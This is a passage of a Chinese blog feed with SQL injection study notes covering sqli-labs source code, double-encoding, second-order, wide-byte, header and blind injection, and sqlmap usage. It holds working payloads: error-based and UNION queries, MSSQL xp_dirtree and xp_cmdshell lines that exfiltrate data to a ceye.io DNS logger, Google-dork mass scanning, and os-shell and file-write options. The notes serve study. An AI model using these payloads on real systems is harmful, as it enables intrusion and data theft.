title="源码分析"></a>源码分析</h4><p>对输入参数做处理的核心代码如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'User Name:'</span>.$uname);</span><br><span class="line">fwrite($fp,<span class="string">'Password:'</span>.$passwd.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 掌握 &lt;code&gt;sqli-labs&lt;/code&gt; 每个关卡的注入原理，熟练使用手工注入和&lt;code&gt;sqlmap&lt;/code&gt; 工具的使用，对源代码进行简单分析。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="sqli-labs" scheme="http://yoursite.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>SQL 注入总结</title>
    <link href="http://yoursite.com/2019/09/07/sqlSum/"/>
    <id>http://yoursite.com/2019/09/07/sqlSum/</id>
    <published>2019-09-07T09:22:04.000Z</published>
    <updated>2019-09-11T06:04:52.191Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 注入总结，及<code>note38-note40</code> 笔记整理。</p><a id="more"></a><!--export--><!--toc--><h3 id="SQL-注入原理"><a href="#SQL-注入原理" class="headerlink" title="SQL 注入原理"></a>SQL 注入原理</h3><p>当 Web 应用向后台数据库传递 SQL 语句进行数据库操作时，若对用户输入的参数没有经过严格的过滤处理，攻击者可以构造特殊 SQL 语句，直接输入数据库引擎执行，获取或修改数据库中数据。</p><ul><li>SQL 注入漏洞本质：把用户输入的数据当作代码执行，违背了“<strong>数据与代码分离</strong>”的原则。</li><li>SQL 注入漏洞有两个关键条件：<ul><li>用户能控制输入内容</li><li>Web 应用把用户输入的内容带入到数据库中执行</li></ul></li></ul><h3 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h3><p><img src="/images/196SQLsum1.png" alt></p><h4 id="二次编码原理"><a href="#二次编码原理" class="headerlink" title="二次编码原理"></a>二次编码原理</h4><p>提交的参数到 Web 服务器时，Web 服务器会自动解码一次，若某处使用了 urldecode 或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入。</p><p><img src="/images/196SQLsum5.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $_POST[<span class="string">'id'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="comment">// debug 20190906 start</span></span><br><span class="line">    <span class="comment">//$tmp = urldecode($_POST['id']);</span></span><br><span class="line">    <span class="comment">//$tmp = addslashes($tmp);</span></span><br><span class="line">    <span class="comment">// debug 20190906 end</span></span><br><span class="line">    $tmp = addslashes($_POST[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before urldecode: "</span> . $tmp;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $tmp = urldecode($tmp);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"POST DATA is: "</span> . $tmp;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $keyword = <span class="string">"/(union select)|(order by)|(-- )|floor\(\)|updatexml\(\)|extractvalue\(\)|\/\*\*\/|(and 1=)/i"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($keyword,$tmp))&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $id = $tmp;</span><br><span class="line">        $conn = @mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">        mysql_query(<span class="string">'set names utf8'</span>);</span><br><span class="line">        @mysql_select_db(<span class="string">'test2'</span>, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">        $select_sql=<span class="string">"SELECT * FROM users WHERE id='$id' limit 0,1"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $select_sql;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        $select_sql_result=mysql_query($select_sql,$conn);</span><br><span class="line">        $data=mysql_fetch_row($select_sql_result);</span><br><span class="line">        mysql_free_result($select_sql_result);</span><br><span class="line">        mysql_close($conn);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;&lt;br/&gt;&lt;p&gt;"</span>;</span><br><span class="line">        print_r($data);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/p&gt;&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当 <code>POST</code> 的数据是 <code>id=1%2527</code> 时，数据发送到服务端会解码一次变为 <code>id=1%27</code>  ，由于没有敏感字符，经过 <code>addslashes()</code> 函数过滤后，还是 <code>id=1%27</code>，此时再经过 <code>urldecode()</code> 解码函数，数据为 <code>id=1&#39;</code> 带入到 SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;1&apos;&apos; limit 0, 1</span><br></pre></td></tr></table></figure><p><img src="/images/196SQLsum4.png" alt></p><p>如把 <code>urldecode()</code> 函数和 <code>addslashes()</code> 函数交换位置，<code>id=1%2527</code> 经服务器解码后为 <code>id=1%27</code> 然后再经 <code>urldecode()</code> 函数解码为 <code>id=1&#39;</code> ，然后再由 <code>addslashes()</code> 后为 <code>id=1\&#39;</code> ，可以看出来返回数据。</p><p><img src="/images/196SQLsum3.png" alt></p><h4 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h4><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行转义，但是 <code>addslashes</code> 虽然参数在过滤后会添加 <code>\</code> 进行转义，但 <code>\</code> 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</p><p>在将数据存入到了数据库中之后，开发者认为数据是可信的，下次需要进行查询的时候，直接从数据库中取出脏数据，没有进行检验和处理，这样会造成 <code>SQL</code> 的二次注入。</p><p><img src="/images/194secinjec.png" alt></p><p>二次注入原理，主要分为两步：</p><ul><li><p>插入恶意数据</p><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p></li><li><p>引用恶意数据</p><p>将数据存入到数据库中后，开发者认为数据是可信的。下次需要查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验何处理。</p></li></ul><h4 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h4><p><img src="/images/197%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.png" alt></p><p>如何防止宽字节注入？</p><ul><li>使用 <code>mysql_set_charset(&quot;GBK&quot;)</code></li><li>使用 <code>mysql_real_escape_string($id)</code></li></ul><p><img src="/images/197%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A51.png" alt></p><h4 id="HTTP-头注入"><a href="#HTTP-头注入" class="headerlink" title="HTTP 头注入"></a>HTTP 头注入</h4><p><code>HTTP</code> 头部部分参数详解</p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>User-Agent</td><td>浏览器向服务器表名自己的身份，使得服务器能够识别客户使用的操作系统，浏览器版本</td></tr><tr><td>Cookie</td><td>网站为了辨别用户身份，进行 session 跟踪而储存在用户本地终端上的数据</td></tr><tr><td>X-Forwarded-For</td><td>简称 XFF 头，它代表客户端，HTTP 请求端真是的 IP</td></tr><tr><td>Referer</td><td>浏览器向 Web 服务器表名自己从哪个页面链接过来的</td></tr><tr><td>Host</td><td>客户端指定自己想访问的 Web 服务器的域名/ IP 地址和端口号</td></tr></tbody></table><p><img src="/images/197User_Agent.png" alt></p><p><img src="/images/197XFF.png" alt></p><h4 id="盲注步骤"><a href="#盲注步骤" class="headerlink" title="盲注步骤"></a>盲注步骤</h4><ol><li>先用 <code>count()</code> 判断个数</li><li>再用 <code>length()</code> 依次判断各个库名，表名，字段名的长度</li><li>用 <code>ascii()</code> + <code>substr()</code> + <code>if()</code> 结合判断出每个字符</li></ol><h4 id="外带查询原理"><a href="#外带查询原理" class="headerlink" title="外带查询原理"></a>外带查询原理</h4><p><img src="/images/197DNS.png" alt></p><p><code>MSSQL</code> 下，可以利用自带的存储过程或创建自定义的存储过程，向外发送网络请求。并利用<code>DNSlog</code> 接收外传的数据。常用的函数有：</p><ul><li><code>xp_subdirs</code></li><li><code>xp_dirtree</code></li><li><code>xp_fileexist</code></li><li><code>xp_cmdshell</code></li></ul><p>前三个存储过程的效果和使用方法几乎一致。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=db_name();</span><br><span class="line">exec(&apos;master..xp_dirtree &quot;//&apos; %2B @a %2B &apos;.o0k708.ceye.io/123&quot;&apos;)</span><br></pre></td></tr></table></figure><p><code>xp_cmdshell</code> 要求必须为 <code>DBA</code> 权限下才可使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &apos;show advanced options&apos;,1;</span><br><span class="line">reconfigure;</span><br><span class="line">sp_configure &apos;xp_cmdshell&apos;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024); </span><br><span class="line">set @a=&apos;www.baidu.com&apos;;</span><br><span class="line">exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><h3 id="SQL-注入流程"><a href="#SQL-注入流程" class="headerlink" title="SQL 注入流程"></a>SQL 注入流程</h3><p><img src="/images/197SQL%E6%B3%A8%E5%85%A5.png" alt></p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p><img src="/images/197%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt></p><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p><img src="/images/197%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.png" alt></p><h5 id="移位溢注（使用ACCESS和MYSQL）"><a href="#移位溢注（使用ACCESS和MYSQL）" class="headerlink" title="移位溢注（使用ACCESS和MYSQL）"></a>移位溢注（使用ACCESS和MYSQL）</h5><p>可以在获取不了列名的情况下获取数据，但是要求后面的表个字段数小于前面表的字段数。</p><p>偏移注入的步骤：</p><ol><li>判断注入点</li><li>order by 判断长度</li><li>判断表名</li><li>联合查询</li><li>获取表中列数</li><li>开始偏移注入</li></ol><p>使用新方法注入：</p><p>获取 admin 表的列数：</p><p>用 <code>order by 24</code> 判断出字段长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 返回错误页面</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,* FROM admin</span><br><span class="line"># 返回错误页面</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,* FROM admin</span><br><span class="line"># 返回错误页面</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* FROM admin</span><br><span class="line"># 返回正确页面，因此admin表列数为4</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* FROM admin</span><br></pre></td></tr></table></figure><p>判断出页面那些位置能够显示数据，比如 13, 14 可以显示数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,admin.*,17,18,19,20,21,22,23,24 FROM admin</span><br></pre></td></tr></table></figure><p><code>admin</code> 表的前两列能够显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,admin.*,15,1617,18,19,20,21,22,23,24 FROM admin</span><br></pre></td></tr></table></figure><p><code>admin</code> 表的后两列能够显示</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="/images/197%E6%8F%90%E6%9D%83.png" alt></p><h5 id="sqlmap-–os-shell-原理"><a href="#sqlmap-–os-shell-原理" class="headerlink" title="sqlmap –os-shell 原理"></a>sqlmap –os-shell 原理</h5><p><code>--os-shell</code> 流程</p><p><img src="/images/os_shell.png" alt></p><p>命令行界面：</p><p><img src="/images/os_shell.jpg" alt></p><p><code>--os-shell</code> 需要的条件：</p><ul><li><code>FILE</code> 权限</li><li>可写的绝对路径</li><li><code>PHP GPC</code> OFF</li></ul><p>原理简述：通过 <code>MySQL</code> 的 <code>into outfile</code> 和 <code>into dumpfile</code> 向网站目录下写入 <code>php</code> 代码，用来执行系统命令。</p><h4 id="MySQL-注入常用函数"><a href="#MySQL-注入常用函数" class="headerlink" title="MySQL 注入常用函数"></a>MySQL 注入常用函数</h4><table><thead><tr><th>函数名称</th><th>函数功能</th><th></th><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>system_user()</td><td>系统用户名</td><td></td><td>concat()</td><td>没有分隔符地连接字符串</td></tr><tr><td>user()</td><td>用户名</td><td></td><td>concat_ws()</td><td>含有分隔符地连接字符串</td></tr><tr><td>current_user()</td><td>当前用户名</td><td></td><td>group_concat()</td><td>连接一个组所有字符串，并以逗号分隔每条数据</td></tr><tr><td>session_user()</td><td>连接数据库的用户名</td><td></td><td>load_file()</td><td>读取本地文件</td></tr><tr><td>database()</td><td>数据库名</td><td></td><td>into outfile()</td><td>写文件</td></tr><tr><td>version()</td><td>数据库版本</td><td></td><td>ascii()</td><td>字符串的 ASCII 码值</td></tr><tr><td>@@datadir</td><td>数据库路径</td><td></td><td>ord()</td><td>返回字符串第一个字符的 ASCII 值</td></tr><tr><td>@@basedir</td><td>数据库安装路径</td><td></td><td>mid()/substr()</td><td>返回一个字符串的一部分</td></tr><tr><td>@@version_compile_os</td><td>操作系统</td><td></td><td>length()</td><td>返回字符串长度</td></tr><tr><td>count()</td><td>返回执行结果数量</td><td></td><td>sleep()</td><td>让语句运行N秒钟</td></tr><tr><td>left()</td><td>返回字符串最左边几个字符</td><td></td><td>if()</td><td>&gt; select if(1&gt;2,2,3);-&gt; 3</td></tr><tr><td>floor()</td><td>返回小于或等于 x 的最大整数</td><td></td><td>char()</td><td>返回 ASCII 代码组成的字符串</td></tr><tr><td>extractvalue()</td><td>用于报错注入</td><td></td><td>updatexml()</td><td>用于报错注入</td></tr><tr><td>strcmp()</td><td>比较字符串内容</td><td></td><td>exp()</td><td>返回 e 的 x 次方</td></tr></tbody></table><p>常用的报错注入语句如下：</p><ul><li>floor()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user()/*存放要查询的 SQL 语句*/,floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><ul><li>extractvalue()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(select user()/*存放要查询的 SQL 语句*/),0x7e)));</span><br></pre></td></tr></table></figure><ul><li>updatexml()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (updatexml(1,concat(0x7e,(select user()/*存放要查询的 SQL 语句*/),0x7e),1));</span><br></pre></td></tr></table></figure><h4 id="sqlmap-的使用"><a href="#sqlmap-的使用" class="headerlink" title="sqlmap 的使用"></a>sqlmap 的使用</h4><h5 id="指定-sqlmap-的探测技术"><a href="#指定-sqlmap-的探测技术" class="headerlink" title="指定 sqlmap 的探测技术"></a>指定 <code>sqlmap</code> 的探测技术</h5><p><code>--technique=TECH</code></p><ul><li>B: Boolean-based blind SQL injection</li><li>E: Error-based SQL injection</li><li>U: UNION query SQL injection</li><li>S: Stacked queries SQL injection</li><li>T: Time-based blind SQL injection</li></ul><h5 id="指定注入参数"><a href="#指定注入参数" class="headerlink" title="指定注入参数"></a>指定注入参数</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> -p <span class="string">"id, user-agent"</span></span><br></pre></td></tr></table></figure><h5 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h5><p>好处：</p><pre><code>1. 方便测试某些网站 2. 代理关联上 `burp` ，方便我们学习 `sqlmap` 发包规则</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --proxy=<span class="string">"http://127.0.0.1:8080"</span></span><br></pre></td></tr></table></figure><p>设置好 <code>burp</code> ，可以在代理界面看到 <code>sqlmap</code> 发送的数据包。</p><h5 id="三种级别：详细程度-探测-风险"><a href="#三种级别：详细程度-探测-风险" class="headerlink" title="三种级别：详细程度/探测/风险"></a>三种级别：详细程度/探测/风险</h5><ul><li>详细程度：注入时 <code>sqlmap</code> 的界面显示的内容详细程度，级别程度为 0-6 ，默认为 1 ，指定参数用 <code>-v</code> 来表示。</li></ul><table><thead><tr><th align="center">级别</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">只显示 python 错误以及严重的信息</td></tr><tr><td align="center">1</td><td align="center">同时显示基本信息和警告信息</td></tr><tr><td align="center">2</td><td align="center">同时显示 debug 信息</td></tr><tr><td align="center">3</td><td align="center">同时显示注入的 payload</td></tr><tr><td align="center">4</td><td align="center">同时显示 HTTP 请求头</td></tr><tr><td align="center">5</td><td align="center">同时显示 HTTP 响应头</td></tr><tr><td align="center">6</td><td align="center">同时显示 HTTP 响应页面</td></tr></tbody></table><ul><li>探测等级：指注入的 <code>payload</code> 语句的复杂程度，级别为 1-5，默认为 1 。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --level=LEVEL</span><br></pre></td></tr></table></figure><ol><li>使用哪些 <code>payload</code> 也影响注入点的选择</li><li><code>GET/POST</code> 都会测试，<code>level 2</code> 时，会测试 <code>cookie</code> ，<code>level 3</code> 时，会测试 <code>User-Agent</code> 和 <code>Referer</code>。</li></ol><ul><li>风险等级：指是否要使用具有不同级别风险的测试语句，级别为 1-3，默认为 1 。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --risk=RISK</span><br></pre></td></tr></table></figure><h5 id="跳过某些参数"><a href="#跳过某些参数" class="headerlink" title="跳过某些参数"></a>跳过某些参数</h5><ul><li>跳过注入参宿</li></ul><p>使用很大的 <code>level</code> 等级，但有些参数并不需要测试，就可以使用 <code>--skip</code> 参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --skip=<span class="string">"user-agent.referer"</span></span><br></pre></td></tr></table></figure><ul><li>跳过 <code>URL</code> 编码</li></ul><p>注入测试语句不经过 <code>url</code> 编码发送到服务器上。</p><ul><li>绕过 <code>URL</code> 重写规则</li></ul><p>有些时候 <code>Web</code> 服务器使用了 <code>URL</code> 重写，导致无法直接使用 <code>sqlmap</code> 测试参数，如 <a href="http://www.info.com/1018/2019.html" target="_blank" rel="noopener">测试URL</a> 这种格式的网址，在测试的参数后面加 <code>*</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://xxxx/info/1018*/2347.html"</span></span><br></pre></td></tr></table></figure><h5 id="闭合注入-Payload"><a href="#闭合注入-Payload" class="headerlink" title="闭合注入 Payload"></a>闭合注入 <code>Payload</code></h5><p>有些环境中，需要在注入的 <code>payload</code> 的前面或后面加一些字符来闭合符号，以保证 <code>payload</code> 的正常执行。</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT * FROM users WHERE id=('"</span>.$_GET[<span class="string">'id'</span>].<span class="string">"') LIMIT 0,1"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时需要使用 <code>--prefix</code> 和 <code>--suffix</code> 参数，来进行闭合：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.111/sqlmap/mysql/get_str_brackets.php?id=1"</span> -p id --prefix <span class="string">"')"</span> --suffix <span class="string">"AND ('abc'='abc"</span></span><br></pre></td></tr></table></figure><p>这样执行的 <code>SQL</code> 语句变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $query = <span class="string">"SELECT * FROM users WHERE id=('1') &lt;PAYLOAD&gt; AND ('abc'='abc') LIMIT 0,1"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="绕过-WAF-设备"><a href="#绕过-WAF-设备" class="headerlink" title="绕过 WAF 设备"></a>绕过 <code>WAF</code> 设备</h5><p><code>--tamper=TAMPER</code>，可以查看 <code>tamper/</code> 目录下有哪些可用的脚本。</p><h5 id="结合-Burp-使用"><a href="#结合-Burp-使用" class="headerlink" title="结合 Burp 使用"></a>结合 <code>Burp</code> 使用</h5><p>复制 <code>burp</code> 拦截的 <code>HTTP</code> 请求包，保存为 <code>1.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">'path/1.txt'</span></span><br></pre></td></tr></table></figure><h5 id="批量扫描-burp-请求日志"><a href="#批量扫描-burp-请求日志" class="headerlink" title="批量扫描 burp 请求日志"></a>批量扫描 <code>burp</code> 请求日志</h5><ol><li>首先配置 <code>burp</code> 记录所有的 <code>request</code> 请求，并保存在指定文件夹</li></ol><p><img src="/images/197burp.png" alt></p><ol start="2"><li>接着浏览器设置 <code>burp</code> 代理，访问测试 url ，查看 <code>sql.txt</code>。</li></ol><p><img src="/images/197sqltxt.png" alt></p><pre><code>3. 使用 `sqlmap` 扫描。</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l sql.txt --batch --smart <span class="comment"># batch 会自动选择 yes; smart 启动快速判断，节约时间</span></span><br></pre></td></tr></table></figure><h5 id="批量扫描文本中的多个目标"><a href="#批量扫描文本中的多个目标" class="headerlink" title="批量扫描文本中的多个目标"></a>批量扫描文本中的多个目标</h5><p>文本中保存 <code>url</code> 格式如下，<code>sqlmap</code> 会一个一个检测。</p><p><img src="/images/197sqlurltxt.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -m url.txt</span><br></pre></td></tr></table></figure><h5 id="利用正则过滤目标网址"><a href="#利用正则过滤目标网址" class="headerlink" title="利用正则过滤目标网址"></a>利用正则过滤目标网址</h5><p>参数：<code>--scope</code></p><p>例如：只想要 www 开头，.com/.net/.org 结尾的网址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l burp.log --scope=<span class="string">"(www)?\.target\.(com|net|org)"</span></span><br></pre></td></tr></table></figure><h5 id="利用谷歌批量扫"><a href="#利用谷歌批量扫" class="headerlink" title="利用谷歌批量扫"></a>利用谷歌批量扫</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g <span class="string">"inurl:\".php?id=1\""</span></span><br></pre></td></tr></table></figure><h5 id="关于文件写入与-shell-获取"><a href="#关于文件写入与-shell-获取" class="headerlink" title="关于文件写入与 shell 获取"></a>关于文件写入与 <code>shell</code> 获取</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--sql-shell<span class="comment"># 执行指定 sql 命令</span></span><br><span class="line">--sql-query<span class="comment"># 执行指定的 sql 语句</span></span><br><span class="line">--file-read<span class="comment"># 读取指定文件</span></span><br><span class="line">--file-write<span class="comment"># 写入本地文件</span></span><br><span class="line">--file-write /<span class="built_in">test</span>/test.txt --file-dest /var/www/html/1.txt <span class="comment"># 将本地的test.txt文件写入目标的1.txt</span></span><br><span class="line">--file-dest<span class="comment"># 要写入文件的绝对路径</span></span><br><span class="line">--os-cmd<span class="comment"># 执行系统命令</span></span><br><span class="line">--os-shell<span class="comment"># 系统交互shell</span></span><br><span class="line">--reg-read<span class="comment"># 